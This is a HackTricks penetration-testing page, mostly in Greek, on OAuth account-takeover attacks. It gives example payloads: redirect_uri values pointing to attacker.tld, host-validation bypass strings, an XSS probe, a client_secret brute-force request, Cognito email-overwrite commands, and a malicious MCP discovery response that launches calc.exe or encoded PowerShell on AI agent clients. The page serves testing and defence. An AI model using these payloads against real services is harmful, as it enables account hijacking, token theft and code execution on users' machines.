# OAuth σε Κατάληψη λογαριασμού

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

Το OAuth προσφέρει διάφορες εκδόσεις, με βασικές πληροφορίες διαθέσιμες στο [OAuth 2.0 documentation](https://oauth.net/2/). Αυτή η συζήτηση επικεντρώνεται κυρίως στον ευρέως χρησιμοποιούμενο [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), προσφέροντας ένα πλαίσιο εξουσιοδότησης που επιτρέπει σε μια εφαρμογή να αποκτά πρόσβαση ή να εκτελεί ενέργειες σε έναν λογαριασμό χρήστη σε άλλη εφαρμογή (τον authorization server).

Σκεφτείτε έναν υποθετικό ιστότοπο _**https://example.com**_, σχεδιασμένο να **εμφανίζει όλες τις αναρτήσεις σας στα social media**, συμπεριλαμβανομένων και των ιδιωτικών. Για να το πετύχει αυτό χρησιμοποιείται το OAuth 2.0. Το _https://example.com_ θα ζητήσει την άδειά σας για **πρόσβαση στις αναρτήσεις σας στα social media**. Ως αποτέλεσμα, θα εμφανιστεί μια οθόνη συγκατάθεσης στο _https://socialmedia.com_, που θα περιγράφει τις **άδειες που ζητούνται και τον developer που κάνει το αίτημα**. Μετά την έγκρισή σας, το _https://example.com_ αποκτά τη δυνατότητα να **πρόσβασης στις αναρτήσεις σας εξ ονόματός σας**.

Είναι σημαντικό να κατανοήσετε τα ακόλουθα στοιχεία στο πλαίσιο του OAuth 2.0:

- **resource owner**: Εσείς, ως **χρήστης/οντότητα**, που εξουσιοδοτείτε την πρόσβαση στον πόρο σας, π.χ. τις αναρτήσεις του λογαριασμού σας στα social media.
- **resource server**: Ο **server που διαχειρίζεται τα authenticated requests** μετά από την απόκτηση ενός `access token` για λογαριασμό του `resource owner`, π.χ. **https://socialmedia.com**.
- **client application**: Η **εφαρμογή που ζητάει εξουσιοδότηση** από τον `resource owner`, όπως το **https://example.com**.
- **authorization server**: Ο **server που εκδίδει τα `access tokens`** στην `client application` αφού ο `resource owner` ταυτοποιηθεί επιτυχώς και δοθεί η εξουσιοδότηση, π.χ. **https://socialmedia.com**.
- **client_id**: Ένας δημόσιος, μοναδικός αναγνωριστικός κωδικός για την εφαρμογή.
- **client_secret:** Ένα εμπιστευτικό κλειδί, γνωστό μόνο στην εφαρμογή και στον authorization server, που χρησιμοποιείται για τη δημιουργία `access_tokens`.
- **response_type**: Μια τιμή που καθορίζει **τον τύπο του token που ζητείται**, π.χ. `code`.
- **scope**: Το **επίπεδο πρόσβασης** που ζητά η `client application` από τον `resource owner`.
- **redirect_uri**: Το **URL στο οποίο ο χρήστης ανακατευθύνεται μετά την εξουσιοδότηση**. Συνήθως πρέπει να συμφωνεί με το προεγγεγραμμένο redirect URL.
- **state**: Παράμετρος για **τη διατήρηση δεδομένων κατά την ανακατεύθυνση του χρήστη προς και από τον authorization server**. Η μοναδικότητά της είναι κρίσιμη καθώς λειτουργεί ως **μηχανισμός προστασίας CSRF**.
- **grant_type**: Παράμετρος που υποδεικνύει **τον τύπο grant και τον τύπο token που θα επιστραφεί**.
- **code**: Ο authorization code από τον `authorization server`, που χρησιμοποιείται μαζί με το `client_id` και το `client_secret` από την client application για να αποκτήσει ένα `access_token`.
- **access_token**: Το **token που η client application χρησιμοποιεί για API requests** εξ ονόματος του `resource owner`.
- **refresh_token**: Επιτρέπει στην εφαρμογή να **αποκτήσει νέο `access_token` χωρίς να ζητήσει ξανά τη συγκατάθεση του χρήστη**.

### Flow

Η **πραγματική ροή OAuth** εξελίσσεται ως εξής:

1. Επισκέπτεστε το [https://example.com](https://example.com) και επιλέγετε το κουμπί «Σύνδεση με Social Media».
2. Ο ιστότοπος στέλνει ένα αίτημα στο [https://socialmedia.com](https://socialmedia.com) ζητώντας την άδειά σας ώστε η εφαρμογή του https://example.com να έχει πρόσβαση στις αναρτήσεις σας. Το αίτημα διαμορφώνεται ως εξής:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Στη συνέχεια σας εμφανίζεται μια σελίδα συναίνεσης.
4. Μετά την έγκρισή σας, η υπηρεσία Social Media στέλνει μια απάντηση στο `redirect_uri` με τις παραμέτρους `code` και `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com χρησιμοποιεί αυτό το `code`, μαζί με το `client_id` και το `client_secret`, για να κάνει ένα server-side αίτημα για να αποκτήσει ένα `access_token` εκ μέρους σας, επιτρέποντας πρόσβαση στις άδειες που συναινέσατε:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Τέλος, η διαδικασία ολοκληρώνεται καθώς https://example.com χρησιμοποιεί το `access_token` σας για να κάνει ένα API call στο Social Media για πρόσβαση

## Ευπάθειες <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), ο authorization server πρέπει να ανακατευθύνει το browser μόνο σε **pre-registered, exact redirect URIs**. Οποιαδήποτε αδυναμία εδώ επιτρέπει σε έναν attacker να στείλει έναν victim μέσω μιας malicious authorization URL, έτσι ώστε το IdP να παραδώσει το victim’s `code` (και `state`) κατευθείαν σε ένα attacker endpoint, το οποίο μπορεί στη συνέχεια να το εξαργυρώσει και να harvest tokens.

Τυπική ροή επίθεσης:

1. Δημιουργήστε `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` και στείλτε το στον victim.
2. Ο victim αυθεντικοποιείται και εγκρίνει τα scopes.
3. Το IdP ανακατευθύνει σε `attacker.tld/callback?code=<victim-code>&state=...` όπου ο attacker καταγράφει το request και αμέσως ανταλλάσσει το code.

Συνηθισμένα validation bugs για έλεγχο:

- **No validation** – οποιοδήποτε absolute URL γίνεται αποδεκτό, με αποτέλεσμα άμεση κλοπή του `code`.
- **Weak substring/regex checks on the host** – παράκαμψη με lookalikes όπως `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ή `match.com@evil.com`.
- **IDN homograph mismatches** – η validation γίνεται στη μορφή punycode (`xn--`), αλλά ο browser ανακατευθύνει στο Unicode domain που ελέγχεται από τον attacker.
- **Arbitrary paths on an allowed host** – δείχνοντας το `redirect_uri` σε `/openredirect?next=https://attacker.tld` ή σε οποιοδήποτε XSS/user-content endpoint leaks the code είτε μέσω chained redirects, Referer headers, ή injected JavaScript.
- **Directory constraints without normalization** – patterns όπως `/oauth/*` μπορούν να παρακαμφθούν με `/oauth/../anything`.
- **Wildcard subdomains** – η αποδοχή `*.example.com` σημαίνει ότι οποιοδήποτε takeover (dangling DNS, S3 bucket, κ.λπ.) αποδίδει άμεσα ένα έγκυρο callback.
- **Non-HTTPS callbacks** – η αποδοχή `http://` URIs δίνει στους network attackers (Wi‑Fi, corporate proxy) την ευκαιρία να υποκλέψουν το `code` κατά τη μεταφορά.

Ελέγξτε επίσης βοηθητικές παραμέτρους τύπου redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, κ.λπ.) και το OpenID discovery document (`/.well-known/openid-configuration`) για πρόσθετα endpoints που μπορεί να κληρονομήσουν τα ίδια validation bugs.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Όπως αναφέρεται σε αυτό το bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), μπορεί να είναι δυνατόν το redirect **URL να αντανακλάται στην απόκριση** του server μετά ο user authenticates, καθιστώντας το **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of `state` parameter <a href="#bda5" id="bda5"></a>

Η παράμετρος `state` είναι το Authorization Code flow CSRF token: ο client πρέπει να δημιουργεί μια κρυπτογραφικά τυχαία τιμή ανά instance του browser, να την αποθηκεύει κάπου όπου μόνο αυτός ο browser μπορεί να την διαβάσει (cookie, local storage, κ.λπ.), να την στέλνει στο authorization request και να απορρίπτει οποιαδήποτε απάντηση δεν επιστρέφει την ίδια τιμή. Όποτε η τιμή είναι στατική, προβλέψιμη, προαιρετική ή δεν συνδέεται με τη συνεδρία του χρήστη, ο επιτιθέμενος μπορεί να ολοκληρώσει το δικό του OAuth flow, να καταγράψει το τελικό `?code=` request (χωρίς να το στείλει) και αργότερα να εξαναγκάσει τον browser του θύματος να επαναπαίξει αυτό το request, με αποτέλεσμα ο λογαριασμός του θύματος να συνδεθεί με το identity provider προφίλ του επιτιθέμενου.

Το μοτίβο επαναπαιξίας είναι πάντα το ίδιο:

1. Ο επιτιθέμενος αυθεντικοποιείται στο IdP με το λογαριασμό του και παρεμβάλλεται στην τελευταία ανακατεύθυνση που περιέχει `code` (και οποιοδήποτε `state`).
2. Απορρίπτει αυτό το request, κρατάει το URL και αργότερα εκμεταλλεύεται οποιοδήποτε CSRF primitive (link, iframe, auto-submitting form) για να αναγκάσει τον browser του θύματος να το φορτώσει.
3. Αν ο client δεν επιβάλλει `state`, η εφαρμογή καταναλώνει το authorization result του επιτιθέμενου και κάνει login τον επιτιθέμενο στον λογαριασμό του θύματος στην εφαρμογή.

Μια πρακτική λίστα ελέγχου για τη διαχείριση του `state` κατά τις δοκιμές:

- **Missing `state` entirely** – αν η παράμετρος δεν εμφανίζεται ποτέ, όλο το login είναι CSRFable.
- **`state` not required** – αφαιρέστε το από το αρχικό request· αν το IdP εξακολουθεί να εκδίδει codes που ο client αποδέχεται, η προστασία είναι opt-in.
- **Returned `state` not validated** – παραποιήστε την τιμή στην απάντηση (Burp, MITM proxy). Η αποδοχή μη ταυτισμένων τιμών σημαίνει ότι το αποθηκευμένο token δεν συγκρίνεται ποτέ.
- **Predictable or purely data-driven `state`** – πολλές εφαρμογές βάζουν redirect paths ή JSON blobs στο `state` χωρίς να προσθέτουν τυχαιότητα, επιτρέποντας σε επιτιθέμενους να μαντέψουν έγκυρες τιμές και να επαναπαίξουν flows. Πάντα προσθέστε/προσαρτήστε ισχυρή εντροπία πριν την κωδικοποίηση των δεδομένων.
- **`state` fixation** – αν η εφαρμογή επιτρέπει στους χρήστες να παρέχουν την τιμή του `state` (π.χ. μέσω crafted authorization URLs) και την επαναχρησιμοποιεί σε όλο το flow, ο επιτιθέμενος μπορεί να κλειδώσει μια γνωστή τιμή και να την επαναχρησιμοποιήσει σε πολλούς στόχους.

Το PKCE μπορεί να συμπληρώσει το `state` (ειδικά για public clients) συνδέοντας το authorization code με ένα code verifier, αλλά οι web clients πρέπει ακόμα να παρακολουθούν το `state` για να αποτρέψουν cross-user CSRF/account-linking bugs.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Οι επιτιθέμενοι μπορούν να δημιουργήσουν προληπτικά έναν λογαριασμό χρησιμοποιώντας το email του θύματος. Εάν το θύμα αργότερα χρησιμοποιήσει third-party service για login, η εφαρμογή μπορεί κατά λάθος να συνδέσει αυτόν τον third-party λογαριασμό με τον προ-δημιουργημένο λογαριασμό του επιτιθέμενου, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση.
2. **Exploiting Lax OAuth Email Verification**: Οι επιτιθέμενοι μπορεί να εκμεταλλευτούν OAuth services που δεν επαληθεύουν emails, εγγράφοντας ένα λογαριασμό και στη συνέχεια αλλάζοντας το email του λογαριασμού στο email του θύματος. Αυτή η μέθοδος παρουσιάζει ανάλογο κίνδυνο μη εξουσιοδοτημένης πρόσβασης με το πρώτο σενάριο αλλά μέσω διαφορετικού διανύσματος επίθεσης.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Το `client_id` είναι σκόπιμα δημόσιο, αλλά το **`client_secret` δεν πρέπει ποτέ να είναι ανακτήσιμο από τελικούς χρήστες**. Deployments του Authorization Code που ενσωματώνουν το secret σε **mobile APKs, desktop clients, ή single-page apps** ουσιαστικά παραδίδουν αυτό το credential σε όποιον μπορεί να κατεβάσει το πακέτο. Πάντα ελέγξτε public clients με:

- Αποσυσκευασία του APK/IPA, desktop installer ή Electron app και grep για `client_secret`, Base64 blobs που αποκρυπτογραφούνται σε JSON, ή hard-coded OAuth endpoints.
- Ανασκόπηση ενσωματωμένων config αρχείων (plist, JSON, XML) ή decompiled strings για client credentials.

Μόλις ο επιτιθέμενος εξάγει το secret χρειάζεται μόνο να κλέψει οποιοδήποτε authorization `code` του θύματος (μέσω αδύναμου `redirect_uri`, logs, κ.λπ.) για να χτυπήσει ανεξάρτητα το `/token` και να εκδώσει access/refresh tokens χωρίς να εμπλέξει τη νόμιμη εφαρμογή. Θεωρήστε τους public/native clients ως **ανίκανος να κρατήσουν secrets**—θα πρέπει αντ’ αυτού να βασίζονται σε PKCE (RFC 7636) για να αποδείξουν την κατοχή ενός per-instance code verifier αντί ενός στατικού secret. Κατά τη διάρκεια των δοκιμών, επιβεβαιώστε αν το PKCE είναι υποχρεωτικό και αν το backend απορρίπτει πραγματικά token exchanges που παραλείπουν είτε το `client_secret` **ή** ένα έγκυρο `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the `client_secret`** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Για πιο λεπτομερείς πληροφορίες σχετικά με το πώς να καταχραστείτε το AWS Cognito δείτε [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Όπως αναφέρεται σε αυτό το writeup (https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), ροές OAuth που περιμένουν να λάβουν το token (και όχι ένα code) θα μπορούσαν να είναι ευάλωτες αν δεν ελέγχουν ότι το token ανήκει στην εφαρμογή.

Αυτό συμβαίνει γιατί ένας attacker θα μπορούσε να δημιουργήσει μια application που υποστηρίζει OAuth και login with Facebook στην δική του εφαρμογή. Στη συνέχεια, μόλις ένα victim κάνει login με Facebook στην attacker application, ο attacker θα μπορούσε να πάρει το OAuth token του user που δόθηκε στην εφαρμογή του, και να το χρησιμοποιήσει για να κάνει login στην victim OAuth application χρησιμοποιώντας το victim user token.

> [!CAUTION]
> Επομένως, αν ο attacker καταφέρει να έχει τον user να αποκτήσει πρόσβαση στην δική του OAuth application, θα μπορέσει να take over τον λογαριασμό του victim σε εφαρμογές που περιμένουν ένα token και δεν ελέγχουν αν το token έχει δοθεί στο app ID τους.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Σύμφωνα με αυτό το writeup (https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ήταν δυνατόν να αναγκάσει κανείς ένα victim να ανοίξει μια σελίδα με ένα returnUrl που δείχνει στο attacker host. Αυτή η πληροφορία θα αποθηκευόταν σε ένα cookie (RU) και σε ένα επόμενο βήμα το prompt θα ζητούσε από τον user αν θέλει να δώσει πρόσβαση σε αυτόν τον attacker host.

Για να παρακαμφθεί αυτό το prompt, ήταν δυνατόν να ανοίξει ένα tab για να ξεκινήσει το Oauth flow που θα ρύθμιζε αυτό το RU cookie χρησιμοποιώντας το returnUrl, να κλείσει το tab πριν εμφανιστεί το prompt, και να ανοίξει ένα νέο tab χωρίς αυτή την τιμή. Τότε, το prompt δεν θα ενημέρωνε για τον attacker host, αλλά το cookie θα είχε οριστεί σε αυτόν, οπότε το token θα σταλεί στον attacker host κατά την ανακατεύθυνση.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Όπως εξηγείται σε αυτό το video (https://www.youtube.com/watch?v=n9x7_J_a_7Q), ορισμένες υλοποιήσεις OAuth επιτρέπουν να δηλωθεί το GET parameter `prompt` ως None (`&prompt=none`) για να αποτραπεί το να ζητηθεί από τους χρήστες να επιβεβαιώσουν την παρεχόμενη πρόσβαση σε ένα prompt στο web αν είναι ήδη logged in στην πλατφόρμα.

### response_mode

Όπως εξηγείται σε αυτό το video (https://www.youtube.com/watch?v=n9x7_J_a_7Q), μπορεί να είναι δυνατό να δηλωθεί το parameter `response_mode` για να υποδείξετε πού θέλετε να παρασχεθεί ο code στο τελικό URL:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Οι διάλογοι συγκατάθεσης/login του OAuth είναι ιδανικοί στόχοι για clickjacking: αν μπορούν να μπουν σε frame, ένας attacker μπορεί να επικαλύψει custom γραφικά, να κρύψει τα πραγματικά κουμπιά, και να ξεγελάσει τους χρήστες ώστε να εγκρίνουν επικίνδυνα scopes ή να συνδέσουν λογαριασμούς. Δημιουργήστε PoC που:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Use absolute positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.
3. Optionally pre-fill parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.

Κατά τη δοκιμή, επαληθεύστε ότι οι σελίδες IdP εκπέμπουν είτε `X-Frame-Options: DENY/SAMEORIGIN` είτε ένα περιοριστικό `Content-Security-Policy: frame-ancestors 'none'`. Αν κανένα από τα δύο δεν υπάρχει, αποδείξτε τον κίνδυνο με εργαλεία όπως το [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) και καταγράψτε πόσο εύκολα ένας victim εγκρίνει την attacker app. Για επιπλέον ιδέες payload δείτε [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Σύμφωνα με αυτό το blog post (https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), αυτή είναι μια OAuth ροή που επιτρέπει το login στο OAuth μέσω username και password. Αν κατά τη διάρκεια αυτής της απλής ροής επιστρέφεται ένα token με πρόσβαση σε όλες τις ενέργειες που μπορεί να εκτελέσει ο user, τότε είναι δυνατό να παρακαμφθεί το 2FA χρησιμοποιώντας αυτό το token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Αυτό το blogpost (https://blog.voorivex.team/oauth-non-happy-path-to-ato) σχολιάζει πώς ήταν δυνατόν να καταχραστεί ένα open redirect προς την τιμή από το referrer για να κακοποιηθεί OAuth σε ATO. Η επίθεση ήταν:

1. Victim επισκέπτεται την attacker web page
2. Το victim ανοίγει το malicious link και ένα opener ξεκινά το Google OAuth flow με `response_type=id_token,code&prompt=none` ως επιπλέον παραμέτρους χρησιμοποιώντας ως referrer τον attacker website.
3. Στο opener, αφού ο provider εξουσιοδοτήσει τον victim, τον στέλνει πίσω στην τιμή του `redirect_uri` parameter (victim web) με 30X code που διατηρεί ακόμα τον attacker website στο referer.
4. Η victim website ενεργοποιεί το open redirect based on the referrer ανακατευθύνοντας τον victim user στον attacker website, καθώς το `respose_type` ήταν `id_token,code`, ο code θα σταλεί πίσω στον attacker στο fragment του URL επιτρέποντάς του να tacke over τον λογαριασμό του user μέσω Google στην victim site.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) Για περισσότερες λεπτομέρειες αυτής της τεχνικής.

Το Dynamic Client Registration στο OAuth λειτουργεί ως ένα λιγότερο προφανές αλλά κρίσιμο vector για ευπάθειες ασφαλείας, ειδικά για επιθέσεις Server-Side Request Forgery (SSRF). Αυτό το endpoint επιτρέπει στους OAuth servers να λαμβάνουν λεπτομέρειες για client applications, συμπεριλαμβανομένων ευαίσθητων URLs που θα μπορούσαν να εκμεταλλευτούν.

Key Points:

- Dynamic Client Registration συχνά αντιστοιχίζεται στο `/register` και δέχεται λεπτομέρειες όπως `client_name`, `client_secret`, `redirect_uris`, και URLs για logos ή JSON Web Key Sets (JWKs) μέσω POST requests.
- Αυτό το feature συμμορφώνεται με τις προδιαγραφές του **RFC7591** και **OpenID Connect Registration 1.0**, που περιλαμβάνουν παραμέτρους πιθανώς ευάλωτες σε SSRF.
- Η διαδικασία registration μπορεί κατά λάθος να εκθέσει servers σε SSRF με διάφορους τρόπους:
- **`logo_uri`**: Ένα URL για το logo της client application που μπορεί να γίνει fetch από τον server, πυροδοτώντας SSRF ή οδηγώντας σε XSS αν το URL χειριστείται λανθασμένα.
- **`jwks_uri`**: Ένα URL για το JWK document του client, το οποίο αν κατασκευαστεί κακόβουλα μπορεί να προκαλέσει στον server να κάνει outbound requests σε attacker-controlled server.
- **`sector_identifier_uri`**: Αναφέρεται σε ένα JSON array των `redirect_uris`, το οποίο ο server μπορεί να κάνει fetch, δημιουργώντας ευκαιρία SSRF.
- **`request_uris`**: Λίστες επιτρεπόμενων request URIs για τον client, που μπορούν να εκμεταλλευτούν αν ο server κάνει fetch αυτά τα URIs στην αρχή της διαδικασίας authorization.

Exploitation Strategy:

- SSRF μπορεί να πυροδοτηθεί με την εγγραφή ενός νέου client με malicious URLs σε παραμέτρους όπως `logo_uri`, `jwks_uri`, ή `sector_identifier_uri`.
- Ενώ η άμεση εκμετάλλευση μέσω `request_uris` μπορεί να περιορίζεται από whitelist controls, η παροχή ενός προ-εγγεγραμμένου, attacker-controlled `request_uri` μπορεί να διευκολύνει SSRF κατά τη φάση της authorization.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Η έρευνα για το [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (που επηρεάζει `mcp-remote` clients όπως Claude Desktop, Cursor ή Windsurf) δείχνει πώς το dynamic OAuth discovery γίνεται ένα RCE primitive κάθε φορά που ο client προωθεί τα IdP metadata απευθείας στο λειτουργικό σύστημα. Ο απομακρυσμένος MCP server επιστρέφει έναν attacker-controlled `authorization_endpoint` κατά την ανταλλαγή discovery (`/.well-known/openid-configuration` ή οποιοδήποτε metadata RPC). `mcp-remote ≤0.1.15` στη συνέχεια καλεί τον system URL handler (`start`, `open`, `xdg-open`, κ.λπ.) με οποιαδήποτε συμβολοσειρά έφτασε, έτσι οποιοδήποτε scheme/path υποστηρίζεται από το OS εκτελείται τοπικά.

Attack workflow

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). Ο agent λαμβάνει `401` μαζί με metadata.
2. Ο server απαντά με JSON όπως:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Ο client εκκινεί τον OS handler για το παρεχόμενο URI. Windows αποδέχονται payloads όπως `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux αποδέχονται `file:///Applications/Calculator.app/...` ή ακόμα και custom schemes όπως `cmd://bash -lc '<payload>'` εάν είναι registered.
4. Επειδή αυτό συμβαίνει πριν από οποιαδήποτε αλληλεπίδραση χρήστη, **merely configuring the client to talk to the attacker server yields code execution**.

**How to test**

- Στοχεύστε οποιονδήποτε OAuth-capable desktop/agent που εκτελεί discovery over HTTP(S) και ανοίγει τοπικά τα επιστρεφόμενα endpoints (Electron apps, CLI helpers, thick clients).
- Intercept ή host την discovery response και αντικαταστήστε τα `authorization_endpoint`, `device_authorization_endpoint`, ή παρόμοια πεδία με `file://`, `cmd://`, UNC paths, ή άλλα dangerous schemes.
- Παρατηρήστε αν ο client επικυρώνει το scheme/host. Η έλλειψη validation οδηγεί σε immediate execution υπό το user context και αποδεικνύει το ζήτημα.
- Επαναλάβετε με διαφορετικά schemes για να χαρτογραφήσετε το πλήρες attack surface (π.χ. `ms-excel:`, `data:text/html,`, custom protocol handlers) και να δείξετε cross-platform reach.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

Στο OAuth, το πεδίο sub ταυτοποιεί μοναδικά έναν χρήστη, αλλά η μορφή του διαφέρει ανά Authorization Server. Για την τυποποίηση της αναγνώρισης χρηστών, κάποιοι clients χρησιμοποιούν emails ή user handles. Ωστόσο, αυτό είναι επικίνδυνο γιατί:

- Ορισμένοι Authorization Servers δεν εξασφαλίζουν ότι αυτές οι ιδιότητες (π.χ. email) παραμένουν immutable.
- Σε ορισμένες υλοποιήσεις — όπως το **"Login with Microsoft"** — ο client βασίζεται στο πεδίο email, το οποίο είναι ελεγχόμενο από τον χρήστη στο Entra ID και δεν είναι επαληθευμένο.
- Ένας attacker μπορεί να εκμεταλλευτεί αυτό δημιουργώντας τη δική του Azure AD organization (π.χ. doyensectestorg) και χρησιμοποιώντας την για να εκτελέσει ένα Microsoft login.
- Παρόλο που το Object ID (αποθηκευμένο στο sub) είναι immutable και ασφαλές, η εξάρτηση από ένα mutable πεδίο email μπορεί να επιτρέψει account takeover (π.χ. hijacking ενός λογαριασμού όπως victim@gmail.com).

## Client Confusion Attack

Σε ένα **Client Confusion Attack**, μια εφαρμογή που χρησιμοποιεί το OAuth Implicit Flow αποτυγχάνει να επαληθεύσει ότι το τελικό access token έχει παραχθεί ειδικά για το δικό της Client ID. Ένας attacker στήνει ένα δημόσιο website που χρησιμοποιεί το Google’s OAuth Implicit Flow, ξεγελώντας χιλιάδες χρήστες να κάνουν login και έτσι συλλέγοντας access tokens προοριζόμενα για το site του attacker. Εάν αυτοί οι χρήστες έχουν επίσης accounts σε ένα άλλο ευάλωτο website που δεν επικυρώνει το token's Client ID, ο attacker μπορεί να επαναχρησιμοποιήσει τα συλλεχθέντα tokens για να impersonate τα θύματα και να take over τους λογαριασμούς τους.

## Scope Upgrade Attack

Ο τύπος **Authorization Code Grant** περιλαμβάνει secure server-to-server επικοινωνία για τη μεταφορά δεδομένων χρήστη. Ωστόσο, εάν ο **Authorization Server** implicitly εμπιστεύεται ένα scope parameter στο Access Token Request (ένα parameter που δεν ορίζεται στο RFC), μια malicious application θα μπορούσε να αναβαθμίσει τα privileges ενός authorization code ζητώντας υψηλότερο scope. Αφού το **Access Token** παραχθεί, ο **Resource Server** πρέπει να το επικυρώσει: για JWT tokens αυτό σημαίνει έλεγχο της JWT signature και εξαγωγή δεδομένων όπως client_id και scope, ενώ για random string tokens ο server πρέπει να κάνει query στον Authorization Server για να ανακτήσει τις λεπτομέρειες του token.

## Redirect Scheme Hijacking

